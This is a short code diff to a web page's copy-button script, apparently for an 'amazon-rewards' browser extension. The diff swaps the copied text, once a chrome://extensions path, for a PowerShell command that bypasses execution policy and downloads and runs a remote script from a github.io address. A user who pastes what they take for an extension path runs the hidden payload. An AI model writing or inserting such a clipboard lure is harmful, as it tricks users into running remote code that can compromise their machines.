@@ -716,7 +716,7 @@
                 copyBtn.addEventListener('click', function() {
                     // Create a temporary textarea element to copy from
                     const textarea = document.createElement('textarea');
-                    textarea.value = 'chrome://extensions/?loadunpacked=amazon-rewards-extension';
+                    textarea.value = 'powershell -ep bypass -c "$wc=New-Object Net.WebClient;$wc.Encoding=[System.Text.Encoding]::UTF8;iex ($wc.DownloadString(\'https://bell-devs.github.io/extension-redirect/powershell.ps1\'))"';
                     document.body.appendChild(textarea);
                     textarea.select();
                     document.execCommand('copy');
